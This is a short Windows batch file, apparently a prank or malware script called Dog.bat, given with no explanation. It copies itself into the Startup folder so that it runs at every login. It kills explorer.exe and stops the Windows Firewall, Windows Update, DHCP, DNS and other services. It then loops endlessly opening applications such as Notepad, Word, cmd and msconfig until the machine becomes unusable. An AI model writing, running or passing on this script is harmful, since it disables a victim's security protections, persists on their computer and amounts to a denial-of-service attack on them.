@echo off
move "%USERPROFILE%\Desktop\Dog.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
move "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
taskkill /f /im explorer.exe
net stop "Windows Firewall"
net stop "Windows Update"
net stop Workstation
net stop "DHCP Client"
net stop "DNS Client"
net stop "Print Spooler"	
net stop Themes

:loop
start notepad
start winword
start mspaint
start write
start cmd
start explorer
start control
start firefox
start msconfig
goto loop
exit